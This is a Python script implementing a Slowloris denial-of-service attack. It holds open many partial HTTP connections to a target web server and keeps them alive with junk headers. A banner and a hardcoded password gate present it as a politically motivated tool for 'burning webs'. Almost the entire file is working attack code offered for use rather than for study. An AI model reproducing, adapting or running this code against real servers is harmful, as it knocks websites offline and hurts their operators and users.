#!/usr/bin/env python
import os
import sys
import socket
import time
import logging
import string
import argparse
import ssl
from random import choice, randint

attemps = 0
os.system('clear')
print("""
\033[37m
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒╔═══════╗▒▒▒▒╔═════╗▒▒▒╔════════╗▒▒╔════════╗▒╔═╗▒▒▒▒▒▒╔═╗▒▒▒▒╔═╗▒▒▒▒
▒▒▒╔         ║▒╔═╝     ╚═╗▒║        ║▒▒║        ║▒║ ║▒▒▒▒▒▒║ ║▒▒▒▒║ ║▒▒▒▒
▒▒▒║ ╔═════╗ ║▒║  ╔═══╗  ║▒║ ╔════╗ ║▒▒║ ╔════╗ ║▒║ ║▒▒▒▒▒▒║ ║▒▒▒▒║ ║▒▒▒▒
▒▒▒║ ║▒▒▒▒▒╚═╝▒║ ╔╝▒▒▒╚╗ ║▒║ ║▒▒▒▒║ ║▒▒║ ║▒▒▒▒╚═╝▒║ ║▒▒▒▒▒▒║ ║▒▒▒▒║ ║▒▒▒▒
▒▒▒║ ╚═══════╗▒║ ║▒▒▒▒▒║ ║▒║ ║▒▒▒▒║ ║▒▒║ ║▒▒▒▒▒▒▒▒║ ║▒▒▒▒▒▒║ ╚════╝ ║▒▒▒▒
▒▒▒║ ╔═════╗ ║▒║ ╚═════╝ ║▒║ ║▒▒▒▒║ ║▒▒║ ╚════╗▒▒▒║ ║▒▒▒▒▒▒║        ║▒▒▒▒
▒▒▒║ ║▒▒▒▒▒║ ║▒║         ║▒║ ║▒▒▒▒║ ║▒▒║      ║▒▒▒║ ║▒▒▒▒▒▒╚╗      ╔╝▒▒▒▒
▒▒▒║ ╚═════╝ ║▒║ ╔═════╗ ║▒║ ╚════╝ ║▒▒║ ╔════╝▒▒▒║ ╚═════╗▒╚═╗  ╔═╝▒▒▒▒▒
▒▒▒╚╗        ║▒║ ║▒▒▒▒▒║ ║▒║       ╔╝▒▒║ ║▒▒▒▒▒▒▒▒║       ║▒▒▒║  ║▒▒▒▒▒▒▒
▒▒▒▒╚═══════╝▒▒╚═╝▒▒▒▒▒╚═╝▒╚═══════╝▒▒▒╚═╝▒▒▒▒▒▒▒▒╚═══════╝▒▒▒╚══╝▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
print(f"\033[97m╔{'═' * 71}╗")
print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 21}\033[0m║")
print(f"\033[97m║\033[104m{' ' * 20}Just to fight to help Palestine{' ' * 20}\033[0m║")
print(f"\033[97m║\033[104m{' ' * 28}_Use it wisely_{' ' * 28}\033[0m║")
print(f"\033[97m╚{'═' * 71}╝")
while attemps < 100:
    print("\033[38;5;6m┏━━ Developer : KunFayz━━⬣")
    print("\033[38;5;6m┏━━ Author : Zblack 313━━⬣")
    username = input("\033[38;5;6m┗> Enter Username: \033[30m")
    password = input("\033[38;5;6m┗> Enter password: \033[30m")

    if username == 'fuck zion' and password == 'free palestine':
        print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
parser = argparse.ArgumentParser(description="Slowloris PoC demonstration in python3")
parser.add_argument('RHOST', nargs="?", help="Remote host, the victim webserver in either domain or IP format")
parser.add_argument('-p', '--port', default=80, help="Port of the remote webserver", type=int)
parser.add_argument('-c', '--count', default=200, help="Number of connections to fire up", type=int)
parser.add_argument('-f', '--freq', default=15, help="Frequency to message the web server", type=int)
parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Enables verbosity")
parser.add_argument('-s', '--https', dest="https", action="store_true", help="Secure the attacker connections with HTTPS")
parser.set_defaults(verbose=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if not args.RHOST:
    print("You must specify a remote server")
    parser.print_help()
    sys.exit(1)


logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%H:%M:%S", level=(logging.DEBUG if args.verbose else logging.INFO))

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

host = args.RHOST
port = args.port
keep_alive_freq = args.freq
connections = args.count

class attacker(object):
    def __init__(self, id, agent, socket):
        self.id = id
        self.agent = agent
        self.socket = socket

def init_attack(nAttackers):
    identifier = 'id{}'.format(nAttackers)
    agent = choice(user_agents).encode()
    ip = socket.gethostbyname(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if args.https:
        ssl.wrap_socket(s)

    s.settimeout(5)
    s.connect((ip, 80))
    s.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 50000)).encode())
    s.send("User-Agent: {}\r\n".format(agent).encode())
    s.send("Cache-Control: no-cache\r\n".encode())
    s.send("Accept-Encoding: {}\r\n".format("gizp, deflate").encode())
    s.send("Accept-Language: {}\r\n".format("en-US,en;q=0.9").encode())
    s.send("Connection: keep-alive\r\n".encode())
    logging.debug("Creating attacker | ID: {}".format(identifier))
    return attacker(identifier, agent, s)

def main():
    logging.info("\033[38;5;6mStarted attacking\033[37m {}\033[33m with {}\033[32m slowly and surely".format(host, connections))  
    logging.info("Establishing connections..")
    attackers = []

    for x in range((connections)):
        try:
            attackers.append(init_attack(len(attackers) + 1))
        except socket.error:
            break

    while True:
        try:
            logging.info("\033[38;5;6mStarted attacking\033[37m {}\033[33m with {}\033[32m slowly and surely".format(host, connections))  
            for s in list(attackers):
                try:
                    s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
                except socket.error as error:
                    logging.debug("Dead attacker: {} | Exception: {}".format(s.id, error))
                    attackers.remove(s)

            for x in range(connections - len(attackers)):
                logging.debug("Reviving dead attacker connections..")
                try:
                    attackers = [(init_attack(len(attackers) + 1))]
                except socket.error:
                    break
            time.sleep(keep_alive_freq)

        except (KeyboardInterrupt, SystemExit):
            print("\nStopping the attack..")
            break
                  
if __name__ == "__main__":
    main()
